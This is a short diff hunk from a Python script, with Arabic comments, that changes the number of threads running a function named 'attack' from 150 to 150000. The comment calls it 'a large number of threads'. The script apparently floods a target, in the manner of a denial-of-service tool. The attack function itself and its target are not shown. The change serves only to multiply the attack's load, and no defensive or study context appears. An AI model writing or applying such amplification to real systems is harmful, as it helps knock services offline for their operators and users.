@@ -30,7 +30,7 @@ def attack():
 
 threads = []
 
-for i in range(150):  # عدد كبير من الثريدات
+for i in range(150000):  # عدد كبير من الثريدات
     thread = threading.Thread(target=attack)
     thread.start()
     threads.append(thread)
